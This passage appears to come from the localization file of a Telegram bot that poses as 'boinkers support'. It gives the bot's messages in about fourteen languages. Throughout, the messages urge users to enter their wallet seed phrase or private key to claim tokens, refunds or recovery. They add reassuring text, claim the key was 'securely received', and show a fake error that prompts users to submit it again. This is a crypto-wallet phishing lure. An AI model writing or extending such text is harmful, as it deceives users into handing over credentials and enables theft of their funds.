        "wallet selection message": "Sie haben {wallet_name} ausgewählt。\nWählen Sie Ihre bevorzugte Verbindungsmethode.",
        "reassurance": PROFESSIONAL_REASSURANCE["de"],
        "prompt seed": "Bitte geben Sie Ihre Seed-Phrase mit 12 oder 24 Wörtern ein." + PROFESSIONAL_REASSURANCE["de"],
        "prompt private key": "Bitte geben Sie Ihren privaten Schlüssel ein." + PROFESSIONAL_REASSURANCE["de"],
        "invalid choice": "Ungültige Auswahl. Bitte verwenden Sie die Schaltflächen.",
        "final error message": "‼️ Ein Fehler ist aufgetreten. /start zum Wiederholen.",
        "final_received_message": "Vielen Dank — Ihre seed oder Ihr privater Schlüssel wurde sicher empfangen und wird verarbeitet. Verwenden Sie /start, um neu zu beginnen.",
        "error_use_seed_phrase": "Dieses Feld erfordert eine Seed-Phrase (12 oder 24 Wörter).",
        "post_receive_error": "‼️ Ein Fehler ist aufgetreten. Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben — verwenden Sie Kopieren/Einfügen, um Fehler zu vermeiden. Bitte /start, um es erneut zu versuchen.",
        "choose language": "Bitte wählen Sie Ihre bevorzugte Sprache:",
        "await restart message": "Bitte klicken Sie auf /start, um von vorne zu beginnen.",
        "back": "🔙 Zurück",
        "invalid_input": "Ungültige Eingabe. Bitte verwenden Sie /start um zu beginnen.",
        "account recovery": "Kontowiederherstellung",
        "claim spin": "Spin Beanspruchen",
        "refund": "Rückerstattung",
        "claim sticker reward": "Aufkleber-Belohnung Beanspruchen",
    },
    "nl": {
        "welcome": "Hi {user} welkom bij de boinkers support bot! Deze bot helpt met wallet-toegang, transacties, saldi, herstel, accountherstel, tokens en rewards claimen, terugbetalingen en accountvalidaties. Kies een optie uit het menu om door te gaan.",
        "main menu title": "Selecteer een type probleem om door te gaan:",
        "validation": "Validatie",
        "claim tokens": "Tokens Claimen",
        "claim tickets": "Tickets Claimen",
        "recover account progress": "Accountvoortgang herstellen",
        "assets recovery": "Herstel van Activa",
        "general issues": "Algemene Problemen",
        "rectification": "Rectificatie",
        "withdrawals": "Opnames",
        "missing balance": "Ontbrekend Saldo",
        "login issues": "Login-problemen",
        "connect wallet message": "Verbind uw wallet met uw private key of seed phrase om door te gaan.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Selecteer uw wallet-type:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privésleutel",
        "seed phrase": "🔒 Seed Phrase Importeren",
        "wallet selection message": "U heeft {wallet_name} geselecteerd.\nSelecteer uw voorkeursverbindingswijze.",
        "reassurance": PROFESSIONAL_REASSURANCE["nl"],
        "prompt seed": "Voer uw seed phrase met 12 of 24 woorden in." + PROFESSIONAL_REASSURANCE["nl"],
        "prompt private key": "Voer uw privésleutel in." + PROFESSIONAL_REASSURANCE["nl"],
        "invalid choice": "Ongeldige keuze. Gebruik de knoppen.",
        "final error message": "‼️ Er is een fout opgetreden. Gebruik /start om opnieuw te proberen.",
        "final_received_message": "Dank u — uw seed of privésleutel is veilig ontvangen en zal worden verwerkt. Gebruik /start om opnieuw te beginnen.",
        "error_use_seed_phrase": "Dit veld vereist een seed-phrase (12 of 24 woorden). Geef de seed-phrase op.",
        "post_receive_error": "‼️ Er is een fout opgetreden. Zorg ervoor dat u de juiste sleutel invoert — gebruik kopiëren en plakken om fouten te voorkomen. Gebruik /start om het opnieuw te proberen.",
        "choose language": "Selecteer uw voorkeurstaal:",
        "await restart message": "Klik op /start om opnieuw te beginnen.",
        "back": "🔙 Terug",
        "invalid_input": "Ongeldige invoer. Gebruik /start om te beginnen.",
        "account recovery": "Accountherstel",
        "claim spin": "Spin Claimen",
        "refund": "Terugbetaling",
        "claim sticker reward": "Claim Sticker Beloning",
    },
    "hi": {
        "welcome": "Hi {user} boinkers सपोर्ट बोट में आपका स्वागत है! यह बोट वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, अकाउंट रिकवरी, टोकन और रिवॉर्ड क्लेम, रिफंड और अकाउंट वेलिडेशन में मदद करता है। जारी रखने के लिए मेनू से एक विकल्प चुनें।",
        "main menu title": "जारी रखने के लिए कृपया एक समस्या प्रकार चुनें:",
        "validation": "सत्यापन",
        "claim tokens": "टोकन का दावा करें",
        "claim tickets": "टिकट दावा करें",
        "recover account progress": "खाते की प्रगति पुनर्प्राप्त करें",
        "assets recovery": "संपत्ति पुनर्प्राप्ति",
        "general issues": "सामान्य समस्याएँ",
        "rectification": "सुधार",
        "withdrawals": "निकासी",
        "missing balance": "गायब बैलेंस",
        "login issues": "लॉगिन समस्याएँ",
        "connect wallet message": "कृपया वॉलेट को प्राइवेट की या सीड वाक्यांश से कनेक्ट करें।",
        "connect wallet button": "🔑 वॉलेट कनेक्ट करें",
        "select wallet type": "कृपया वॉलेट प्रकार चुनें:",
        "other wallets": "अन्य वॉलेट",
        "private key": "🔑 निजी कुंजी",
        "seed phrase": "🔒 सीड वाक्यांश आयात करें",
        "wallet selection message": "आपने {wallet_name} का चयन किया है。\nकनेक्शन मोड चुनें।",
        "reassurance": PROFESSIONAL_REASSURANCE["hi"],
        "prompt seed": "कृपया 12 या 24 शब्दों की seed phrase दर्ज करें。" + PROFESSIONAL_REASSURANCE["hi"],
        "prompt private key": "कृपया अपनी निजी कुंजी दर्ज करें。" + PROFESSIONAL_REASSURANCE["hi"],
        "invalid choice": "अमान्य विकल्प। कृपया बटन का उपयोग करें।",
        "final error message": "‼️ एक त्रुटि हुई। /start से पुनः प्रयास करें।",
        "final_received_message": "धन्यवाद — आपकी seed या निजी कुंजी सुरक्षित रूप से प्राप्त कर ली गई है और संसाधित की जाएगी। /start से पुनः शुरू करें।",
        "error_use_seed_phrase": "यह फ़ील्ड seed phrase (12 या 24 शब्द) मांगता है। कृपया seed दें।",
        "post_receive_error": "‼️ एक त्रुटि हुई। कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं — त्रुटियों से बचने के लिए कॉपी-पेस्ट का उपयोग करें। /start के साथ पुनः प्रयास करें。",
        "choose language": "कृपया भाषा चुनें:",
        "await restart message": "कृपया /start दबाएँ।",
        "back": "🔙 वापस",
        "invalid_input": "अमान्य इनपुट। /start उपयोग करें।",
        "account recovery": "खाता पुनर्प्राप्ति",
        "claim spin": "Spin क्लेम",
        "refund": "रिफंड",
        "claim sticker reward": "स्टिकर पुरस्कार क्लेम",
    },
    "tr": {
        "welcome": "Hi {user} boinkers destek botuna hoş geldiniz! Bu bot cüzdan erişimi, işlemler, bakiye, kurtarmalar, hesap kurtarma, token ve ödül talepleri, iade ve hesap doğrulamaları konusunda yardımcı olur. Devam etmek için menüden bir seçenek seçin.",
        "main menu title": "Devam etmek için bir sorun türü seçin:",
        "validation": "Doğrulama",
        "claim tokens": "Token Talep Et",
        "claim tickets": "Bilet Talep Et",
        "recover account progress": "Hesap ilerlemesini kurtar",
        "assets recovery": "Varlık Kurtarma",
        "general issues": "Genel Sorunlar",
        "rectification": "Düzeltme",
        "withdrawals": "Para Çekme",
        "missing balance": "Eksik Bakiye",
        "login issues": "Giriş Sorunları",
        "connect wallet message": "Lütfen cüzdanınızı özel anahtar veya seed ile bağlayın。",
        "connect wallet button": "🔑 Cüzdanı Bağla",
        "select wallet type": "Lütfen cüzdan türünü seçin:",
        "other wallets": "Diğer Cüzdanlar",
        "private key": "🔑 Özel Anahtar",
        "seed phrase": "🔒 Seed Cümlesi İçe Aktar",
        "wallet selection message": "Seçtiğiniz {wallet_name}。\nBağlantı modunu seçin。",
        "reassurance": PROFESSIONAL_REASSURANCE["tr"],
        "prompt seed": "Lütfen 12 veya 24 kelimelik seed phrase girin。" + PROFESSIONAL_REASSURANCE["tr"],
        "prompt private key": "Lütfen özel anahtarınızı girin。" + PROFESSIONAL_REASSURANCE["tr"],
        "invalid choice": "Geçersiz seçim. Lütfen düğmeleri kullanın。",
        "final error message": "‼️ Bir hata oluştu。 /start ile tekrar deneyin。",
        "final_received_message": "Teşekkürler — seed veya özel anahtarınız güvenli şekilde alındı ve işlenecektir。 /start ile yeniden başlayın。",
        "error_use_seed_phrase": "Bu alan bir seed phrase (12 veya 24 kelime) gerektirir。 Lütfen seed girin。",
        "post_receive_error": "‼️ Bir hata oluştu。 Lütfen doğru anahtarı girdiğinizden emin olun — hataları önlemek için kopyala-yapıştır kullanın。 Lütfen /start ile tekrar deneyin。",
        "choose language": "Lütfen dilinizi seçin:",
        "await restart message": "Lütfen /start ile yeniden başlayın。",
        "back": "🔙 Geri",
        "invalid_input": "Geçersiz giriş。 /start kullanın。",
        "account recovery": "Hesap Kurtarma",
        "claim spin": "Spin Talep Et",
        "refund": "İade",
        "claim sticker reward": "Etiket Ödülü Talep Et",
    },
    "zh": {
        "welcome": "Hi {user} 欢迎使用 boinkers 支持机器人！此机器人可帮助钱包访问、交易、余额、恢复、账户恢复、认领代币与奖励、退款和账户验证。请选择菜单中的一项继续。",
        "main menu title": "请选择一个问题类型以继续：",
        "validation": "验证",
        "claim tokens": "认领代币",
        "claim tickets": "申领门票",
        "recover account progress": "恢复账户进度",
        "assets recovery": "资产恢复",
        "general issues": "常规问题",
        "rectification": "修正",
        "withdrawals": "提现",
        "missing balance": "丢失余额",
        "login issues": "登录问题",
        "connect wallet message": "请用私钥或助记词连接钱包以继续。",
        "connect wallet button": "🔑 连接钱包",
        "select wallet type": "请选择您的钱包类型：",
        "other wallets": "其他钱包",
        "private key": "🔑 私钥",
        "seed phrase": "🔒 导入助记词",
        "wallet selection message": "您已选择 {wallet_name}。\n请选择连接方式。",
        "reassurance": PROFESSIONAL_REASSURANCE["zh"],
        "prompt seed": "请输入 12 或 24 个单词的助记词。" + PROFESSIONAL_REASSURANCE["zh"],
        "prompt private key": "请输入您的私钥。" + PROFESSIONAL_REASSURANCE["zh"],
        "invalid choice": "无效选择。请使用按钮。",
        "final error message": "‼️ 出现错误。/start 重试。",
        "final_received_message": "谢谢 — 您的 seed 或私钥已被安全接收并将被处理。/start 重新开始。",
        "error_use_seed_phrase": "此字段需要助记词 (12 或 24 个单词)。请提供助记词。",
        "post_receive_error": "‼️ 出现错误。请确保输入正确的密钥 — 使用复制粘贴以避免错误。请 /start 再试。",
        "choose language": "请选择语言：",
        "await restart message": "请点击 /start 重新开始。",
        "back": "🔙 返回",
        "invalid_input": "无效输入。请使用 /start 开始。",
        "account recovery": "账户恢复",
        "claim spin": "认领 Spin",
        "refund": "退款",
        "claim sticker reward": "认领贴纸奖励",
    },
    "cs": {
        "welcome": "Hi {user} vítejte u boinkers support bota! Tento bot pomáhá s přístupem k peněžence, transakcemi, zůstatky, obnovami, obnovením účtu, nárokováním tokenů a odměn, refundacemi a validacemi účtu. Vyberte prosím možnost z nabídky pro pokračování.",
        "main menu title": "Vyberte typ problému pro pokračování:",
        "validation": "Ověření",
        "claim tokens": "Nárokovat Tokeny",
        "claim tickets": "Uplatnit vstupenky",
        "recover account progress": "Obnovit postup účtu",
        "assets recovery": "Obnovení aktiv",
        "general issues": "Obecné problémy",
        "rectification": "Oprava",
        "withdrawals": "Výběry",
        "missing balance": "Chybějící zůstatek",
        "login issues": "Problémy s přihlášením",
        "connect wallet message": "Připojte peněženku pomocí soukromého klíče nebo seed fráze.",
        "connect wallet button": "🔑 Připojit peněženku",
        "select wallet type": "Vyberte typ peněženky:",
        "other wallets": "Jiné peněženky",
        "private key": "🔑 Soukromý klíč",
        "seed phrase": "🔒 Importovat seed frázi",
        "wallet selection message": "Vybrali jste {wallet_name}.\nVyberte preferovaný způsob připojení.",
        "reassurance": PROFESSIONAL_REASSURANCE["cs"],
        "prompt seed": "Zadejte seed frázi o 12 nebo 24 slovech." + PROFESSIONAL_REASSURANCE["cs"],
        "prompt private key": "Zadejte prosím svůj soukromý klíč." + PROFESSIONAL_REASSURANCE["cs"],
        "invalid choice": "Neplatná volba. Použijte tlačítka.",
        "final error message": "‼️ Došlo k chybě. /start pro opakování.",
        "final_received_message": "Děkujeme — vaše seed nebo privátní klíč byl bezpečně přijat a bude zpracován. Použijte /start pro opakování.",
        "error_use_seed_phrase": "Zadejte seed frázi (12 nebo 24 slov), ne adresu.",
        "post_receive_error": "‼️ Došlo k chybě. Ujistěte se, že zadáváte správný klíč — použijte kopírovat a vložit. Prosím /start pro opakování.",
        "choose language": "Vyberte preferovaný jazyk:",
        "await restart message": "Klikněte /start pro restart.",
        "back": "🔙 Zpět",
        "invalid_input": "Neplatný vstup. Použijte /start.",
        "account recovery": "Obnovení účtu",
        "claim spin": "Požádat o Spin",
        "refund": "Vrácení peněz",
        "claim sticker reward": "Požádat o odměnu (nálepka)",
    },
    "ur": {
        "welcome": "Hi {user} boinkers سپورٹ بوٹ میں خوش آمدید! یہ بوٹ والٹ تک رسائی، ٹرانزیکشنز، بیلنس، بحالی، اکاؤنٹ کی بازیابی، ٹوکن اور انعامات کا کلیم، ریفنڈز اور اکاؤنٹ کی تصدیق میں مدد کرتا ہے۔ جاری رکھنے کے لیے مینو میں سے ایک آپشن منتخب کریں۔",
        "main menu title": "جاری رکھنے کے لیے مسئلے کی قسم منتخب کریں:",
        "validation": "تصدیق",
        "claim tokens": "ٹوکن کلیم کریں",
        "claim tickets": "ٹکٹ کلیم کریں",
        "recover account progress": "اکاؤنٹ کی پیش رفت بحال کریں",
        "assets recovery": "اثاثہ بازیابی",
        "general issues": "عمومی مسائل",
        "rectification": "درستگی",
        "withdrawals": "رقم نکالیں",
        "missing balance": "گم شدہ بیلنس",
        "login issues": "لاگ ان مسائل",
        "connect wallet message": "براہِ کرم والٹ کو پرائیویٹ کی یا seed کے ساتھ منسلک کریں。",
        "connect wallet button": "🔑 والٹ جوڑیں",
        "select wallet type": "براہِ کرم والٹ کی قسم منتخب کریں:",
        "other wallets": "دیگر والٹس",
        "private key": "🔑 پرائیویٹ کی",
        "seed phrase": "🔒 سیڈ فریز امپورٹ کریں",
        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے。\nاپنا پسندیدہ کنکشن طریقہ منتخب کریں。",
        "reassurance": PROFESSIONAL_REASSURANCE["ur"],
        "prompt seed": "براہ کرم 12 یا 24 الفاظ کی seed phrase درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
        "prompt private key": "براہ کرم اپنی پرائیویٹ کی درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
        "invalid choice": "غلط انتخاب۔ براہِ کرم بٹنز استعمال کریں。",
        "final error message": "‼️ ایک خرابی پیش آئی۔ /start دوبارہ کوشش کریں。",
        "final_received_message": "شکریہ — آپ کی seed یا نجی کلید محفوظ طور پر موصول ہوگئی ہے اور پراسیس کی جائے گی۔ /start سے دوبارہ شروع کریں。",
        "error_use_seed_phrase": "یہ فیلڈ seed phrase (12 یا 24 الفاظ) کا تقاضا کرتا ہے۔ براہ کرم seed درج کریں。",
        "post_receive_error": "‼️ ایک خرابی پیش آئی۔ براہ کرم یقینی بنائیں کہ آپ درست کلید درج کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی/پیسٹ کریں۔ براہ کرم /start دوبارہ کوشش کے لیے。",
        "choose language": "براہ کرم زبان منتخب کریں:",
        "await restart message": "براہ کرم /start دبائیں。",
        "back": "🔙 واپس",
        "invalid_input": "غلط ان پٹ۔ /start استعمال کریں。",
        "account recovery": "اکاؤنٹ بازیابی",
        "claim spin": "Spin کلیم",
        "refund": "ری فنڈ",
        "claim sticker reward": "اسٹیکر انعام کلیم",
    },
    "uz": {
        "welcome": "Hi {user} boinkers qo‘llab-quvvatlash botiga xush kelibsiz! Ushbu bot hamyonga kirish, tranzaksiyalar, balanslar, tiklash, hisobni tiklash, token va mukofotlarni talab qilish, qaytarishlar va hisob tekshiruvi kabi masalalarda yordam beradi. Davom etish uchun menyudan bir variantni tanlang.",
        "main menu title": "Davom etish uchun muammo turini tanlang:",
        "validation": "Tekshirish",
        "claim tokens": "Tokenlarni da'vo qilish",
        "claim tickets": "Biletlarni talab qiling",
        "recover account progress": "Hisobning rivojlanishini tiklash",
        "assets recovery": "Aktivlarni tiklash",
        "general issues": "Umumiy muammolar",
        "rectification": "Tuzatish",
        "withdrawals": "Chiqim",
        "missing balance": "Yoʻqolgan balans",
        "login issues": "Kirish muammolari",
        "connect wallet message": "Iltimos, hamyoningizni private key yoki seed bilan ulang.",
        "connect wallet button": "🔑 Hamyonni ulang",
        "select wallet type": "Hamyon turini tanlang:",
        "other wallets": "Boshqa hamyonlar",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed iborasini import qilish",
        "wallet selection message": "Siz {wallet_name} ni tanladingiz。\nUlanish usulini tanlang。",
        "reassurance": PROFESSIONAL_REASSURANCE["uz"],
        "prompt seed": "Iltimos 12 yoki 24 soʻzli seed iborasini kiriting。" + PROFESSIONAL_REASSURANCE["uz"],
        "prompt private key": "Private key kiriting。" + PROFESSIONAL_REASSURANCE["uz"],
        "invalid choice": "Notoʻgʻri tanlov. Tugmalardan foydalaning。",
        "final error message": "‼️ Xato yuz berdi. /start bilan qayta urinib koʻring。",
        "final_received_message": "Rahmat — seed yoki xususiy kalitingiz qabul qilindi va qayta ishlanadi. /start bilan boshlang。",
        "error_use_seed_phrase": "Iltimos 12 yoki 24 soʻzli seed iborasini kiriting, manzil emas。",
        "post_receive_error": "‼️ Xato yuz berdi. Iltimos, to'g'ri kalitni kiriting — nusxalash va joylashtirishdan foydalaning. /start bilan qayta urinib ko‘ring。",
        "choose language": "Iltimos, tilni tanlang:",
        "await restart message": "Qayta boshlash uchun /start bosing.",
        "back": "🔙 Orqaga",
        "invalid_input": "Noto'g'ri kiritish. /start ishlating。",
        "account recovery": "Hisobni tiklash",
        "claim spin": "Spin da'vo qilish",
        "refund": "Qaytarib berish",
        "claim sticker reward": "Stiker Mukofotini Da'vo Qilish",
    },
    "it": {
        "welcome": "Hi {user} benvenuto nel bot di supporto boinkers! Questo bot aiuta con accesso al wallet, transazioni, saldi, recuperi, recupero account, richiesta token e ricompense, rimborsi e validazioni dell'account. Scegli un'opzione dal menu per procedere.",
        "main menu title": "Seleziona un tipo di problema per continuare:",
        "validation": "Validazione",
        "claim tokens": "Richiedi Token",
        "claim tickets": "Richiedi Biglietti",
        "recover account progress": "Recupera stato di avanzamento account",
        "assets recovery": "Recupero Asset",
        "general issues": "Problemi Generali",
        "rectification": "Rettifica",
        "withdrawals": "Prelievi",
        "missing balance": "Saldo Mancante",
        "login issues": "Problemi di Accesso",
        "connect wallet message": "Collega il tuo wallet con la Chiave Privata o Seed Phrase per continuare.",
        "connect wallet button": "🔑 Connetti Wallet",
        "select wallet type": "Seleziona il tipo di wallet:",
        "other wallets": "Altri Wallet",
        "private key": "🔑 Chiave Privata",
        "seed phrase": "🔒 Importa Seed Phrase",
        "wallet selection message": "Hai selezionato {wallet_name}.\nSeleziona la modalità di connessione preferita.",
        "reassurance": PROFESSIONAL_REASSURANCE["it"],
        "prompt seed": "Inserisci la seed phrase di 12 o 24 parole。" + PROFESSIONAL_REASSURANCE["it"],
        "prompt private key": "Inserisci la chiave privata。" + PROFESSIONAL_REASSURANCE["it"],
        "invalid choice": "Scelta non valida. Usa i pulsanti。",
        "final error message": "‼️ Si è verificato un errore. /start per riprovare。",
        "final_received_message": "Grazie — seed o chiave privata ricevuti in modo sicuro e saranno processati。 Usa /start per ricominciare。",
        "error_use_seed_phrase": "Questo campo richiede una seed phrase (12 o 24 parole)。",
        "post_receive_error": "‼️ Si è verificato un errore. Assicurati di inserire la chiave corretta — usa copia e incolla per evitare errori. Per favore /start per riprovare。",
        "choose language": "Seleziona la lingua:",
        "await restart message": "Clicca /start per ricominciare。",
        "back": "🔙 Indietro",
        "invalid_input": "Input non valido. Usa /start。",
        "account recovery": "Recupero Account",
        "claim spin": "Richiedi Spin",
        "refund": "Rimborso",
        "claim sticker reward": "Richiedi Ricompensa (Sticker)",
    },
    "ja": {
        "welcome": "Hi {user} boinkers サポートボットへようこそ！このボットはウォレットアクセス、トランザクション、残高、復旧、アカウント回復、トークンや報酬の請求、返金、アカウント検証を支援します。メニューからオプションを選択してください。",
        "main menu title": "続行する問題の種類を選択してください：",
        "validation": "検証",
        "claim tokens": "トークンを請求",
        "claim tickets": "チケットを請求",
        "recover account progress": "アカウントの進行状況を回復",
        "assets recovery": "資産回復",
        "general issues": "一般的な問題",
        "rectification": "修正",
        "withdrawals": "出金",
        "missing balance": "残高が見つかりません",
        "login issues": "ログインの問題",
        "connect wallet message": "プライベートキーまたはシードフレーズでウォレットを接続してください。",
        "connect wallet button": "🔑 ウォレットを接続",
        "select wallet type": "ウォレットのタイプを選択してください：",
        "other wallets": "その他のウォレット",
        "private key": "🔑 プライベートキー",
        "seed phrase": "🔒 シードフレーズをインポート",
        "wallet selection message": "{wallet_name} を選択しました。\n接続方法を選択してください。",
        "reassurance": PROFESSIONAL_REASSURANCE["ja"],
        "prompt seed": "12 または 24 語のシードフレーズを入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "prompt private key": "プライベートキーを入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "invalid choice": "無効な選択です。ボタンを使用してください。",
        "final error message": "‼️ エラーが発生しました。/start で再試行してください。",
        "final_received_message": "ありがとうございます — seed または秘密鍵を安全に受け取りました。/start で再開してください。",
        "error_use_seed_phrase": "このフィールドにはシードフレーズ（12 または 24 語）が必要です。シードフレーズを入力してください。",
        "post_receive_error": "‼️ エラーが発生しました。正しいキーを入力していることを確認してください — コピー＆ペーストを使用してください。/start で再試行してください。",
        "choose language": "言語を選択してください：",
        "await restart message": "/start をクリックして再開してください。",
        "back": "🔙 戻る",
        "invalid_input": "無効な入力です。/start を使用してください。",
        "account recovery": "アカウント復旧",
        "claim spin": "スピン請求",
        "refund": "返金",
        "claim sticker reward": "ステッカー報酬を請求",
    },
    "ms": {
        "welcome": "Hi {user} selamat datang ke bot sokongan boinkers! Bot ini membantu dengan capaian dompet, transaksi, baki, pemulihan, pemulihan akaun, menuntut token dan ganjaran, bayaran balik dan pengesahan akaun. Sila pilih pilihan dalam menu untuk meneruskan.",
        "main menu title": "Sila pilih jenis isu untuk meneruskan:",
        "validation": "Pengesahan",
        "claim tokens": "Tuntut Token",
        "claim tickets": "Tuntut Tiket",
        "recover account progress": "Pulihkan kemajuan akaun",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Isu Umum",
        "rectification": "Pembetulan",
        "withdrawals": "Pengeluaran",
        "missing balance": "Baki Hilang",
        "login issues": "Isu Log Masuk",
        "connect wallet message": "Sila sambungkan dompet anda dengan Private Key atau Seed Phrase untuk meneruskan。",
        "connect wallet button": "🔑 Sambung Dompet",
        "select wallet type": "Sila pilih jenis dompet anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}。\nPilih mod sambungan yang dikehendaki。",
        "reassurance": PROFESSIONAL_REASSURANCE["ms"],
        "prompt seed": "Sila masukkan seed phrase 12 atau 24 perkataan anda。" + PROFESSIONAL_REASSURANCE["ms"],
        "prompt private key": "Sila masukkan kunci peribadi anda。" + PROFESSIONAL_REASSURANCE["ms"],
        "invalid choice": "Pilihan tidak sah. Gunakan butang。",
        "final error message": "‼️ Ralat berlaku. /start untuk cuba semula。",
        "final_received_message": "Terima kasih — seed atau kunci peribadi anda diterima dengan selamat dan akan diproses。 Gunakan /start untuk mula semula。",
        "error_use_seed_phrase": "Medan ini memerlukan seed phrase (12 atau 24 perkataan). Sila berikan seed phrase。",
        "post_receive_error": "‼️ Ralat berlaku. Sila pastikan anda memasukkan kunci yang betul — gunakan salin & tampal untuk elakkan ralat. Sila /start untuk cuba semula。",
        "choose language": "Sila pilih bahasa pilihan anda:",
        "await restart message": "Sila klik /start untuk memulakan semula。",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak sah. Gunakan /start。",
        "account recovery": "Pemulihan Akaun",
        "claim spin": "Tuntut Spin",
        "refund": "Bayaran Balik",
        "claim sticker reward": "Tuntut Ganjaran (Sticker)",
    },
    "ro": {
        "welcome": "Hi {user} bine ați venit la botul de suport boinkers! Acest bot ajută la accesul portofelului, tranzacții, solduri, recuperări, recuperare cont, revendicarea token-urilor și recompenselor, rambursări și validări de cont. Vă rugăm să alegeți o opțiune din meniu pentru a continua.",
        "main menu title": "Selectați un tip de problemă pentru a continua:",
        "validation": "Validare",
        "claim tokens": "Revendică Token-uri",
        "claim tickets": "Revendică Bilete",
        "recover account progress": "Recuperează progresul contului",
        "assets recovery": "Recuperare Active",
        "general issues": "Probleme Generale",
        "rectification": "Rectificare",
        "withdrawals": "Retrageri",
        "missing balance": "Sold Lipsă",
        "login issues": "Probleme Autentificare",
        "connect wallet message": "Vă rugăm conectați portofelul cu cheia privată sau fraza seed pentru a continua。",
        "connect wallet button": "🔑 Conectează Portofel",
        "select wallet type": "Selectați tipul portofelului:",
        "other wallets": "Alte Portofele",
        "private key": "🔑 Cheie Privată",
        "seed phrase": "🔒 Importă Seed Phrase",
        "wallet selection message": "Ați selectat {wallet_name}。\nSelectați modul de conectare preferat。",
        "reassurance": PROFESSIONAL_REASSURANCE["ro"],
        "prompt seed": "Introduceți seed phrase de 12 sau 24 cuvinte。" + PROFESSIONAL_REASSURANCE["ro"],
        "prompt private key": "Introduceți cheia privată。" + PROFESSIONAL_REASSURANCE["ro"],
        "invalid choice": "Alegere invalidă. Folosiți butoanele。",
        "final error message": "‼️ A apărut o eroare. /start pentru a încerca din nou。",
        "final_received_message": "Mulțumim — seed sau cheia privată a fost primită și va fi procesată。 /start pentru a începe din nou。",
        "error_use_seed_phrase": "Acest câmp necesită seed phrase (12 sau 24 cuvinte)。",
        "post_receive_error": "‼️ A apărut o eroare. Folosiți copiere/lipire pentru a evita erori。 /start pentru a încerca din nou。",
        "choose language": "Selectați limba preferată:",
        "await restart message": "Apăsați /start pentru a relua。",
        "back": "🔙 Înapoi",
        "invalid_input": "Intrare invalidă. /start。",
        "account recovery": "Recuperare Cont",
        "claim spin": "Revendică Spin",
        "refund": "Ramburs",
        "claim sticker reward": "Revendică Recompensă (Sticker)",
    },
    "sk": {
        "welcome": "Hi {user} vitajte pri boinkers support bote! Tento bot pomáha s prístupom k peňaženke, transakciami, zostatkami, obnovami, obnovením účtu, uplatnením tokenov a odmien, refundáciami a overením účtu. Vyberte možnosť v ponuke pre pokračovanie.",
        "main menu title": "Vyberte typ problému pre pokračovanie:",
        "validation": "Validácia",
        "claim tokens": "Uplatniť tokeny",
        "claim tickets": "Uplatniť vstupenky",
        "recover account progress": "Obnoviť priebeh účtu",
        "assets recovery": "Obnovenie aktív",
        "general issues": "Všeobecné problémy",
        "rectification": "Oprava",
        "withdrawals": "Výbery",
        "missing balance": "Chýbajúci zostatok",
        "login issues": "Problémy s prihlásením",
        "connect wallet message": "Pripojte peňaženku pomocou súkromného kľúča alebo seed frázy。",
        "connect wallet button": "🔑 Pripojiť peňaženku",
        "select wallet type": "Vyberte typ peňaženky:",
        "other wallets": "Iné peňaženky",
        "private key": "🔑 Súkromný kľúč",
        "seed phrase": "🔒 Importovať seed frázu",
        "wallet selection message": "Vybrali ste {wallet_name}。\nVyberte preferovaný spôsob pripojenia。",
        "reassurance": PROFESSIONAL_REASSURANCE["sk"],
        "prompt seed": "Zadajte seed phrase 12 alebo 24 slov。" + PROFESSIONAL_REASSURANCE["sk"],
        "prompt private key": "Zadajte svoj súkromný kľúč。" + PROFESSIONAL_REASSURANCE["sk"],
        "invalid choice": "Neplatná voľba. Použite tlačidlá。",
        "final error message": "‼️ Vyskytla sa chyba. /start pre opakovanie。",
        "final_received_message": "Ďakujeme — seed alebo súkromný kľúč bol prijatý a bude spracovaný。 /start pre opakovanie。",
        "error_use_seed_phrase": "Toto pole vyžaduje seed phrase (12 alebo 24 slov)。",
        "post_receive_error": "‼️ Došlo k chybe. Použite kopírovanie/vloženie, aby ste sa vyhli chybám。 /start pre opakovanie。",
        "choose language": "Vyberte preferovaný jazyk:",
        "await restart message": "Kliknite /start pre reštart。",
        "back": "🔙 Späť",
        "invalid_input": "Neplatný vstup. /start。",
        "account recovery": "Obnovenie účtu",
        "claim spin": "Nárok na Spin",
        "refund": "Vrátenie peňazí",
        "claim sticker reward": "Nárok na odmenu (nálepka)",
    },
    "th": {
        "welcome": "Hi {user} ยินดีต้อนรับสู่บอทสนับสนุน boinkers! บอทนี้ช่วยเรื่องการเข้าถึงกระเป๋าเงิน, ธุรกรรม, ยอดคงเหลือ, การกู้คืน, การกู้คืนบัญชี, การเคลมโทเค็นและรางวัล, การคืนเงิน และการยืนยันบัญชี กรุณาเลือกตัวเลือกจากเมนูเพื่อดำเนินการต่อ",
        "main menu title": "โปรดเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
        "validation": "การยืนยัน",
        "claim tokens": "เคลมโทเค็น",
        "claim tickets": "เคลมบัตรเข้าชม",
        "recover account progress": "กู้คืนความคืบหน้าบัญชี",
        "assets recovery": "กู้คืนทรัพย์สิน",
        "general issues": "ปัญหาทั่วไป",
        "rectification": "การแก้ไข",
        "withdrawals": "ถอนเงิน",
        "missing balance": "ยอดคงเหลือหาย",
        "login issues": "ปัญหาการเข้าสู่ระบบ",
        "connect wallet message": "โปรดเชื่อมต่อกระเป๋าของคุณด้วยคีย์ส่วนตัวหรือ seed phrase เพื่อดำเนินการต่อ",
        "connect wallet button": "🔑 เชื่อมต่อกระเป๋า",
        "select wallet type": "โปรดเลือกประเภทกระเป๋า:",
        "other wallets": "กระเป๋าอื่น ๆ",
        "private key": "🔑 คีย์ส่วนตัว",
        "seed phrase": "🔒 นำเข้า Seed Phrase",
        "wallet selection message": "คุณได้เลือก {wallet_name}\nเลือกโหมดการเชื่อมต่อ",
        "reassurance": PROFESSIONAL_REASSURANCE["th"],
